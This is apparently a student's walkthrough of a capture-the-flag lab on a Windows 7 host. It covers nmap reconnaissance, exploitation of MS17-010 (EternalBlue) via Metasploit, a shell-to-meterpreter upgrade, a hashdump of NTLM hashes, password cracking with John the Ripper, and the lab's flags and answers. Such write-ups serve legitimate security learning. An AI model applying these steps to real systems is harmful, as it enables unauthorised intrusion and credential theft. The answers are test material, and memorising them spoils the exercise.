Task 1 - Recon

1) How many ports are open with a port number under 1000?
* 3
```
└─$ sudo nmap -sS -Pn -p0-1000 -sV 10.10.24.245
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 13:54 PDT
Nmap scan report for 10.10.24.245
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

port 135 = RPC
port 139 & 445 = SMB ports
```
└─$ smbclient -L 10.10.24.245
Password for [WORKGROUP\gomez22]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.24.245 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

2) What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
The hint states `Revealed by the ShadowBrokers, exploits an issue within SMBv1`, but I didn't get any SMB version info from nmap.
I did a quick google search for the best ways to find out SMB version info and found this site: `https://serverfault.com/questions/378732/how-do-i-find-out-what-version-of-smb-is-enabled-on-a-remote-host`.

I ran an nmap scan using the web page's info as a guide
```
└─$ nmap -p139,445 --script smb-protocols 10.10.24.245
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 14:10 PDT
Nmap scan report for 10.10.24.245
Host is up (0.16s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|_    2.1

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

So I can see the SMBv1 is "dangerous" but I still need to find the answer to this question. I did some searching and found several
MSXX-XXX vulns but I haven't found the right one yet.

Eventually, I stumbled on to the answer on this site: `https://viperone.gitbook.io/pentest-everything/writeups/hackthebox/windows-machines/legacy`

* MS17-010

enum4linux
```
Looking up status of 10.10.24.245                                                          
        JON-PC          <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        JON-PC          <20> -         B <ACTIVE>  File Server Service
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser

        MAC Address = 02-A0-6D-4B-C8-71

```

another nmap scan
```
└─$ sudo nmap --script smb-os-discovery 10.10.24.245
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-12 14:17 PDT
Nmap scan report for 10.10.24.245
Host is up (0.17s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-12T16:21:51-05:00

```

No luck with smb with this new info. 

Task 2 - Gain Access


1) Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
* I ran `search ms17-0101` in metasploit which gave me the answer: `exploit/windows/smb/ms17_010_eternalblue`.

2) Show options and set the one required value. What is the name of this value? (All caps for submission)
* RHOSTS (`use` the exploit then `show options`)

3) ran the exploit and got a shell!

Task 3 - Escalate

1) If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
* post/multi/manage/shell_to_meterpreter

2) Select this (use MODULE_PATH). Show options, what option are we required to change?
* Session

NOTE: I followed the instructions for the rest of this task. It's very scaffolded and I don't see the need to write what I did.

Task 4 - Cracking

1) Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 
* jon

hashdump output
```
3420  3384  powershell.ex  x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\Wi
             e                                                     ndowsPowerShell\v1.0\p
                                                                   owershell.exe
...
meterpreter > migrate 2948
[*] Migrating from 3420 to 2948...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

2) Copy this password hash to a file and research how to crack it. What is the cracked password?

No luck with Hashcat but I used john the ripper instead!
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/john-bleeding-jumbo/run]
└─$ ./john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt /home/gomez22/blue/jon_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)  
```

* alqfna22  

Task 5 - Find flags

1) Flag1? This flag can be found at the system root. 
```
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-12 19:13:36 -0800  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-13 22:08:56 -0700  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 20:20:08 -0700  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 15:22:01 -0700  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 15:28:38 -0700  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 15:35:57 -0700  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-12 19:13:22 -0800  Recovery
040777/rwxrwxrwx  4096   dir   2019-03-17 15:35:55 -0700  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-12 19:13:28 -0800  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 15:36:30 -0700  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 12:27:21 -0700  flag1.txt
000000/---------  0      fif   1969-12-31 16:00:00 -0800  hiberfil.sys
000000/---------  0      fif   1969-12-31 16:00:00 -0800  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}meterpreter > 
```
* flag{access_the_machine}

2) Flag2? This flag can be found at the location where passwords are stored within Windows.
A quick google search told me that passwords are stored at `C:\Windows\System32\Config`
```
meterpreter > cd Windows/System32/Config
meterpreter > ls
Listing: C:\Windows\System32\Config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
...
100666/rw-rw-rw-  34        fil   2019-03-17 12:32:48 -0700  flag2.txt
```
* flag{sam_database_elevated_access}

3) flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
* flag{admin_documents_can_be_valuable}

The flag is found in flag3.txt which is in C:\Users\Jon\Documents.
